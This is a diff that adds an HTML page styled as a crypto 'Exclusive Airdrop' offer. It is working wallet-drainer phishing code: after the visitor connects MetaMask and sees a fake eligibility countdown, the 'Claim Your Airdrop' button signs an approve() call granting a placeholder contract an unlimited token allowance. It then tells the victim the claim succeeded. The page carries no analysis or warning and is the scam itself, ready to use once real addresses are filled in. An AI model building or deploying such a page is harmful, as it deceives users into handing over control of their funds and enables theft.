@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Exclusive Airdrop - Limited Offer 🔥</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            margin-top: 50px;
+            background-color: #f8f9fa;
+        }
+        h1 {
+            color: #007bff;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        #claimBtn {
+            display: none;
+        }
+        #countdown {
+            font-size: 18px;
+            color: red;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎁 Congratulations! You are eligible for an Airdrop 🎁</h1>
+    <p id="countdown"></p>
+    <button id="connectBtn" onclick="connectWallet()">🔗 Connect Wallet</button>
+    <button id="claimBtn" onclick="approveTokens()">💰 Claim Your Airdrop</button>
+
+    <script>
+        let provider, signer;
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                alert("Please install MetaMask to continue.");
+                return;
+            }
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            document.getElementById("connectBtn").style.display = "none";
+            
+            
+            let countdown = 5;
+            document.getElementById("countdown").style.display = "block";
+            let timer = setInterval(() => {
+                document.getElementById("countdown").innerText = `⏳ Verifying eligibility... ${countdown} seconds remaining`;
+                countdown--;
+                if (countdown < 0) {
+                    clearInterval(timer);
+                    document.getElementById("countdown").style.display = "none";
+                    document.getElementById("claimBtn").style.display = "block";
+                }
+            }, 1000);
+        }
+
+        async function approveTokens() {
+            const airdropToken = "0xYourAirdropTokenAddress";
+            const claimContract = "0xYourContractAddress"; 
+
+            const tokenContract = new ethers.Contract(
+                airdropToken,
+                ["function approve(address spender, uint256 amount) public returns (bool)"],
+                signer
+            );
+
+            try {
+                const tx = await tokenContract.approve(claimContract, ethers.constants.MaxUint256);
+                await tx.wait();
+                alert("✅ Your Airdrop claim has been successfully approved!");
+            } catch (error) {
+                alert("❌ Approval failed! Please try again.");
+                console.error(error);
+            }
+        }
+    </script>
+</body>
+</html>
